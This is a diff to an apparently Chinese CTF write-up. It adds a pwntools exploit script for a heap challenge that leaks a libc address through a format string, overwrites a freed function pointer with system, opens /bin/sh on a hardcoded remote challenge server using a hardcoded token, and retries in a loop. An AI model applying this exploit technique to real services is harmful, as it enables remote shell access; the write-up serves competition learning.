@@ -90,6 +90,93 @@ C --> B --> A
 
 **6.** 接着再执行一遍以上过程，从新触发任意函数执行的漏洞，执行system('/bin/sh')即可获取shell
 
+**7.** 利用代码如下
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+global io
+
+def create_list(io,length,strr):
+	io.recvuntil('quit')
+	io.sendline('create ')
+	io.recvuntil('Pls give string size:')
+	io.sendline(length)
+	io.recvuntil('str:')
+	io.sendline(strr)
+
+def delete_list(io,number):
+	io.recvuntil('quit')
+	io.sendline('delete ')
+	io.recvuntil('id:')
+	io.sendline(number)
+	io.recvuntil('Are you sure?:')
+	io.sendline('yes')
+
+
+def pwn():
+	global io
+
+	debug = 0
+	if debug:
+   	 	io = process('./pwn1')
+	else:
+		#io = remote('127.0.0.1',2333)
+		io = remote('115.28.78.54',80)
+		io.recvuntil('please input you token: ')
+		io.sendline('b66888c818c08d932ea91b8d6a1f122c2y7ZAdbh')
+#------------------------------------------------use fsb to leak __libc_start_main's address
+	create_list(io,'10','aaaa')
+	create_list(io,'10','bbbb')
+	create_list(io,'10','cccc')
+	delete_list(io,'0')
+	delete_list(io,'1')
+	delete_list(io,'2')
+	content1 = "%175$p".ljust(24,'a')+'\xd0\xf9\x00'
+	create_list(io,'29',content1)
+	delete_list(io,'1')                     #-----printf('%113$p')
+
+	data = io.recv(14)
+	libc_start_main = int(data,16)-240
+	print "libc_start_main_addr="+hex(libc_start_main)
+#--------------------------------------------------caculate system_addr	
+	libc_start_main_offset = 0x20740
+	system_addr = 0x45380
+	system_addr = libc_start_main  - libc_start_main_offset + system_addr
+	print "system_addr=" + hex(system_addr)
+
+	if debug:
+		gdb.attach(pidof('pwn1')[-1],open('debug'))
+
+	create_list(io,'10','zzzz\x00')
+
+	create_list(io,'10','aaaa\x00')
+	create_list(io,'10','bbbb\x00')
+	create_list(io,'10','cccc\x00')
+	delete_list(io,'2')
+	delete_list(io,'3')
+	delete_list(io,'4')
+#----------can't have '\x00' in string.because len(string) must >15.And after '/bin/sh' must have a space.
+	content2 = "/bin/sh #".ljust(24,'a')+ p64(system_addr)  
+	create_list(io,'32',content2)
+	delete_list(io,'3')                     #system('/bin/sh')
+	
+	io.sendline('uname -a')
+	io.interactive()
+
+
+
+if __name__ == '__main__':
+	while True:
+		try:
+			pwn()
+		except EOFError:
+			print 'guess not success!!!'
+			io.close()
+			time.sleep(5)
+```
+
 ### 唠叨几句：
 这是第一次接触到还带猜的pwn，所以详细的记录了一下解题过程。猜的过程也比较有意思，由于主办方采取了一定的防DOS措施：当检测到访问过于频繁时就会禁止访问该题。加之学校ip出口都是一个，校内还有一些大佬也在fuzz这个题，所以导致fuzz过程异常艰难！
 
